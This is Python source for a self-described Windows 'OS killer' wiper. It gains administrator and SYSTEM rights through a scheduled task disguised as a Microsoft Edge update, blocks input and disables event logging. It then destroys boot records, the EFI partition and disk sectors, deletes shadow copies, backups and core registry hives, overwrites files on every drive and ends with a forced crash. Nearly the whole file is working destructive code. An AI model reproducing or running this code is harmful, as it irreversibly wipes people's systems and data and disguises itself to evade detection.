# !!!__THIS_IS_NOT_A_PROFESSIONAL_WIPER__!!!




# THIS IS MY WONDERFUL PROJECT
# THIS IS A VERY DANGEROUS PROJECT
# BUT FOR ME IT IS ART
# I WAS TRYING TO EXTRACT ALL FROM PYTHON
# PYTHON IS MY FAVORITE PROGRAMMING LANGUAGE
# FOR PROGRAMMING THIS IS MY SECOND LIFE




#SECTION CREATOR 



# GITHUB   : https://github.com/cppandpython
# NAME     : Vladislav 
# SURNAME  : Khudash  
# AGE      : 17

# DATE     : 22.03.2026
# APP      : WINKILLER
# TYPE     : OS_KILLER
# PLATFORM : win32



#END CREATOR




#SECTION ANTI-ANALYSIS



import sys
sys.dont_write_bytecode = True
import os


if sys.platform != 'win32':
    try:
        sys.stderr.write(f'DO NOT SUPPORT OS ({sys.platform})')
    finally:
        os._exit(0)
    

getattr(sys, 'setswitchinterval', lambda _: None)(0.03)


import ctypes as capi
from ctypes.wintypes import (
    BOOLEAN,    HANDLE,
           DWORD,
    ULONG,      ULARGE_INTEGER
)


mem      = memoryview
array    = bytearray
cchar    = capi.c_char
cref     = capi.byref

_argv    = sys.argv
_si      = sys.intern
_urandom = os.urandom
_join    = os.path.join
_isexst  = os.path.exists
windll   = capi.windll
ntdll    = windll.ntdll
advapi32 = windll.advapi32
shell32  = windll.shell32
kernel32 = windll.kernel32
user32   = windll.user32
_exit    = os._exit

__file__ = os.path.realpath(_argv[ 0 ])


try:
    with open(__file__, 'rb', buffering=0) as i:
        i.seek(0)

        IS_EXE = i.read(2) == b'MZ'
except OSError:
        IS_EXE = False




#END ANTI-ANALYSIS






import gc       as _gc
import signal   as sig

from winreg             import HKEY_LOCAL_MACHINE,              HKEY_USERS
from subprocess         import run                as sp_run,    DEVNULL
from warnings           import filterwarnings     as _off_warn
from logging            import disable            as _off_log
from concurrent.futures import ThreadPoolExecutor as Tpool
from locale             import getencoding
from collections        import deque




_4mb   = 4_194_304
_8mb   = 8_388_608
_16mb  = 16_777_216
_64mb  = 67_108_864 
_s_fm  = 0o170000  
_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'




FLAG_SYSTEM = _si('-s')


PYEXE = os.path.realpath(sys.executable)


POOL_WORKERS = ( os.cpu_count() or 3 ) << 1
POOL_TIMEOUT = 3 
POOL         = Tpool(POOL_WORKERS)


SYSTEMDISK = os.getenv('SYSTEMDRIVE', 'C:\\')

if not SYSTEMDISK.endswith('\\'):
    SYSTEMDISK += '\\'

WINDIR   = os.getenv('WINDIR', 'Windows')
SYSTEM32 = _join(WINDIR, 'System32')


URANDOM = mem(_urandom(_64mb))




def is_bios():
    fw = DWORD()
    kernel32.GetFirmwareType(cref(fw))

    return fw.value == 1


def getenc():
    cp = f'cp{kernel32.GetConsoleOutputCP()}'

    try:
        'CPython'.encode(cp)

        return cp
    except (UnicodeEncodeError, LookupError):
        return getencoding()


def reg_unload(h, k, _f=advapi32.RegUnLoadKeyW):
    return _f(h, k) == 0


def reg_del(h, k, _f=advapi32.RegDeleteTreeW):
    return _f(h, k) == 0


def tmap(
    func, 
    itr, 
    _ir = iter,
    _nx = next,
    _rg = range,
    _dq = deque,
    _sb = POOL.submit, 
    _tm = POOL_TIMEOUT, 
    _ck = POOL_WORKERS,
    _si = StopIteration,
    _ex = Exception
):
    itr = _ir(itr)


    dq = _dq()
    da = dq.append
    dp = dq.popleft


    for _ in _rg(_ck):
        try:
            da(_sb(func, _nx(itr)))
        except _si:
            break
 

    while dq:
        t = dp()

        try:
            yield t.result(_tm)
        except _ex:
            pass 
            
        try:
            da(_sb(func, _nx(itr)))
        except _si:
            continue


def cmd(c, out=False, _en=getenc(), _sp=sp_run):
    try:
        
        if out:
            return _sp(
                c, 
                capture_output = True, 
                text           = True,
                encoding       = _en,
                timeout        = 3
            ).stdout


        return _sp(
            c, 
            stdin              = DEVNULL,
            stdout             = DEVNULL, 
            stderr             = DEVNULL, 
            timeout            = 3
        ).returncode
    
    except Exception:
        return '' if out else -1
    

def get_physical_drives(_md=len(_chars), _er=HANDLE(-1).value):
    for i in range(_md):
        pd = f'\\\\.\\PhysicalDrive{i}'
        hd = kernel32.CreateFileW(pd, 0x80000000, 3, None, 3, 0x80, None)

        if hd != _er:
            kernel32.CloseHandle(hd)
            yield pd
    

def get_usz_disk(nd):
    total = ULARGE_INTEGER()
    free  = ULARGE_INTEGER()

    ok = kernel32.GetDiskFreeSpaceExW(nd, None, cref(total), cref(free))

    return total.value - free.value if ok else None


def write_dev(dev, sz, _lu=len(URANDOM), _er=HANDLE(-1).value):
    handle = kernel32.CreateFileW(dev, 0x40000000, 0x3, None, 3, 0x80, None)
        
    if handle == _er:
        return False
    

    wtr = DWORD()
    buf = (cchar * _lu).from_buffer(URANDOM)

    for i in range(0, sz, _8mb):
        ck = min(_8mb, sz - i, _lu)
        kernel32.WriteFile(handle, cref(buf, 0), ck, cref(wtr), None)


    kernel32.FlushFileBuffers(handle)
    kernel32.CloseHandle(handle)


    return True


def get_admin():
    if (shell32.IsUserAnAdmin() != 0) or (FLAG_SYSTEM in _argv):
        return
    

    if IS_EXE:
        exe = __file__
        arg = None
    else:
        exe = PYEXE
        arg = __file__
    

    shell32.ShellExecuteW(None, 'runas', exe, arg, None, 0)
    _exit(0)


def get_SYSTEM():
    if FLAG_SYSTEM in _argv:
        return
    

    task = 'MicrosoftEdgeUpdateTaskMachineCore'


    if IS_EXE:
        exe = __file__
        arg = FLAG_SYSTEM
    else:
        exe = PYEXE
        arg = f'{__file__} {FLAG_SYSTEM}'
    

    c = (
        f'$t = New-ScheduledTaskAction -Execute "{exe}" -Argument "{arg}"; '
         '$e = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DisallowDemandStart:$false -DisallowDemandStop:$true -Priority 3; '
        f'Register-ScheduledTask -TaskName "{task}" -Action $t -Settings $e -Description "Microsoft Corporation." -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType Service -RunLevel Highest) -Force; '
        f'Start-ScheduledTask -TaskName "{task}"'
    )
    

    ok = cmd(('powershell', '-WindowStyle', 'Hidden', '-Command', c)) == 0

    if ok:
        _exit(0)


def S_ISREG(m, _e=0o100000, _f=_s_fm): 
    return (m & _f) == _e


def S_ISLNK(m, _e=0o120000, _f=_s_fm): 
    return (m & _f) == _e


def remove_file(
    p, 
    _lm = _4mb, 
    _ur = URANDOM[ 0 : _4mb ],
    _ie = isinstance,
    _de = os.DirEntry,
    _ls = os.lstat,
    _il = S_ISLNK,
    _ir = S_ISREG,
    _at = os.chmod,
    _op = open,
    _ex = OSError
):
    try:

        if _ie(p, _de):
            st = p.stat()
            p  = p.path

        else:
            st = _ls(p) 

            if _il(st.st_mode):
                return False


        if not _ir(st.st_mode):
            return False


        sz = st.st_size

    except _ex:
        return False


    if sz == 0:
        return True
    elif sz > _lm:
        sz = _lm
    

    try:

        try:
            _at(p, 0o200)
        except _ex:
            pass

        with _op(p, 'rb+', buffering=0) as f:
            f.write(_ur[ 0 : sz ])
        
        return True
    except _ex:
        return False
    

def iter_dir(
    p,
    _q = deque,
    _s = os.scandir,
    _i = type(
            '', 
            (),
            {
                '__slots__' : ( 'path', ),
                '__init__'  : lambda t, w : t.__setattr__('path', w)
            }
    ),
    _x = OSError
):
    c = _q(( _i(p), ))

    u = c.appendleft
    g = c.pop


    while c:
        try:

            f = _s(g().path)

            try:

                for e in f:

                    if e.is_dir(follow_symlinks=False):
                        u(e)
                        continue

                    else:
                        yield e

            finally:
                f.close()

        except _x:
            continue


def remove_dir(
    p, 
    _dq = deque,
    _mp = tmap,
    _it = iter_dir,
    _rm = remove_file
):
    _dq(_mp(_rm, _it(p)), maxlen=0)
            

def set_efi_privileges(): # доделать и таже UEFI
    ...
    

def BCD():
    EDIT = 'bcdedit'


    records = {
        '{bootmgr}',    '{fwbootmgr}',    
        '{current}',    '{default}',    
                '{memdiag}'
    }


    au = records.add
    lb = '--------'
    cf = False

    for l in cmd((EDIT, '/enum', 'all'), out=True).splitlines():

        if cf:
            start = l.find( '{')
            end   = l.rfind('}')

            if (start != -1) and (end != -1):
                au(l[ start : end + 1 ])
                cf = False


        elif l.startswith(lb):
            cf = True


    cmd((EDIT, '/set', '{bootmgr}',   'displayorder', _urandom(8).hex()))
    cmd((EDIT, '/set', '{fwbootmgr}', 'displayorder', _urandom(8).hex()))


    for r in records:
        cmd((EDIT, '/delete', r, '/f'))


    reg_unload(HKEY_LOCAL_MACHINE, 'BCD00000000')
    reg_del(   HKEY_LOCAL_MACHINE, 'BCD00000000')


    for p in (
        _join(SYSTEMDISK, 'Boot', 'BCD'                    ),
        _join(SYSTEM32,   'Boot', 'BCD'                    ),
        _join(SYSTEM32,   'config', 'BCD'                  ),
        _join(SYSTEMDISK, 'EFI', 'Boot', 'BCD'             ),
        _join(SYSTEMDISK, 'EFI', 'Microsoft', 'Boot', 'BCD'),
        _join(SYSTEM32,   'BCD-Template'                   ),
        _join(SYSTEM32,   'config', 'BCD-Template'         )
    ):
        remove_file(p) 

        
def ESP():
    MOUNT = 'mountvol'


    for c in _chars:
        if _isexst(f'{c}:\\'):
            continue

        tom  = f'{c}:'
        disk = f'{tom}\\'
        break

    else:
        return
    

    lb = '\\\\?\\'

    for v in cmd((MOUNT,), out=True).splitlines():
        v = v.strip()

        if not v.startswith(lb):
            continue


        cmd((MOUNT, tom, v))


        if not (_isexst(_join(disk, 'Boot')) or _isexst(_join(disk, 'EFI'))):
            cmd((MOUNT, tom, '/d'))
            continue


        sz = get_usz_disk(disk)

        if sz is None:
            sz = _16mb
        elif sz > _64mb:
            sz = _64mb
        

        ok = write_dev(f'\\\\.\\{tom}', sz)

        if not ok:
            remove_dir(disk)


        cmd((MOUNT, tom, '/d'))


def UEFI():###
    ...


def BIOS():
    _mbr = mem(b'\x55\xAA')

    for pd in get_physical_drives():
        try:

            with open(pd, 'rb', buffering=0) as d:
                d.seek(510)

                if d.read(2) == _mbr:
                    dev = pd
                    break

        except OSError:
            continue

    else:
        return
    

    write_dev(dev, _16mb)
            

def DEVICE():
    wpd = lambda d: write_dev(d, _16mb)
    deque(tmap(wpd, get_physical_drives()), maxlen=0)


def WINDOWS():
    for c in (
        ('reagentc', '/disable'),
        ('powershell', '-WindowStyle', 'Hidden', '-Command', 
                f'Disable-ComputerRestore -Drive "{SYSTEMDISK}"'),
        ('vssadmin', 'delete', 'shadows', '/all', '/quiet'),
        ('wbadmin', 'delete', 'catalog', '-quiet')
    ):
        cmd(c)


    for (h, k) in (
        (HKEY_LOCAL_MACHINE, 'HARDWARE'  ),      
        (HKEY_LOCAL_MACHINE, 'SYSTEM'    ),         
        (HKEY_LOCAL_MACHINE, 'SECURITY'  ),       
        (HKEY_LOCAL_MACHINE, 'SAM'       ),
        (HKEY_LOCAL_MACHINE, 'COMPONENTS'),
        (HKEY_USERS,         'DEFAULT'   )        
    ):
        reg_unload(h, k)
        reg_del(   h, k)


    remove_dir(SYSTEMDISK)


    for c in _chars:
        d = f'{c}:\\'

        if not _isexst(d) or (d == SYSTEMDISK):
            continue


        remove_dir(d)


def RAM():
    sz  = _64mb + _64mb

    raw = []

    _ar = array
    _ap = raw.append


    try:

        while True:
            _ap(_ar(sz))

    except (MemoryError, OverflowError): 
        pass
    

    raw.clear()
    _gc.collect()


def BSOD():
    ntdll.RtlAdjustPrivilege(19, True, False, cref(BOOLEAN()))
    ntdll.NtRaiseHardError(0xC0000022, 0, 0, None, 0, cref(ULONG()))

    capi.memset(0, 1, 1)


def siginit():
    sigs   = set(range(1, 32)) - {sig.SIGKILL, sig.SIGSTOP}
    sigign = sig.SIG_IGN
    sigset = sig.signal
    

    if hasattr(sig, 'SIGRTMIN') and hasattr(sig, 'SIGRTMAX'):
        sigs |= set(range(sig.SIGRTMIN, sig.SIGRTMAX + 1))


    for n in ('SIGALRM', 'SIGVTALRM', 'SIGPROF'):
        s = getattr(sig, n, None)

        if s is not None:
            sigs.add(s)


    for s in sigs:
        try:
            sigset(s, sigign)
        except Exception:
            continue


def init_proc():###
    siginit()


    proc   = kernel32.GetCurrentProcess()
    thread = ntdll.GetCurrentThread()
    fsp    = ULONG(1)


    kernel32.SetErrorMode(0x8001)
    kernel32.SetProcessDEPPolicy(1)
    kernel32.SetThreadExecutionState(0x80000003)
    kernel32.SetProcessShutdownParameters(0x4FF, 0)
    ntdll.RtlSetProcessIsCritical(True, None, False)
    kernel32.SetPriorityClass(proc, 0x80) 
    ntdll.NtSetInformationThread(thread, 0x11, None, 0)
    ntdll.NtSetInformationProcess(proc, 0x21, cref(fsp), 4)
    

    cmd(('sc', 'stop', 'EventLog'))
    cmd(('sc', 'config', 'EventLog', 'start=', 'disabled'))


def main():
    _off_warn('ignore')
    _off_log(50)

    sys.settrace(None)
    sys.setprofile(None)

    _gc.set_debug(0)
    _gc.disable()
    _gc.collect()


    get_admin()
    get_SYSTEM()


    user32.BlockInput(True)
    init_proc()


    _gc.collect()


    for _ in (
        BCD,
        ESP,
        BIOS if is_bios() else UEFI,
        DEVICE,
        WINDOWS
    ):
        try:
            _()
        except:
            continue


    POOL.shutdown(False)
    _gc.collect()


    RAM()
    BSOD()


    _gc.collect()
    _exit(0)




try:
    main()
finally:
    _exit(0)